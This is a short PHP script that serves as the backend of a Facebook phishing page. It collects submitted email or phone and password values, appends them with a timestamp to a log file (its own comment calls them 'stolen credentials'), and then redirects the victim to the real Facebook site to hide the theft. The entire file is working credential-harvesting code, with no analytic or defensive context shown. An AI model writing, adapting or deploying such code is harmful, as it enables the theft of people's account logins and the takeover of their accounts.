<?php
// File to store stolen credentials
$file = "log.txt";

// Collect POST data safely
$email = isset($_POST['email']) ? $_POST['email'] : '';
$pass = isset($_POST['pass']) ? $_POST['pass'] : '';

// Save the data with timestamp
if (!empty($email) && !empty($pass)) {
    $data = "Email/Phone: " . $email . " | Password: " . $pass . " | Time: " . date("Y-m-d H:i:s") . "\n";
    file_put_contents($file, $data, FILE_APPEND);
}

// Redirect to original Facebook site
header("Location: https://facebook.com");
exit();
?>
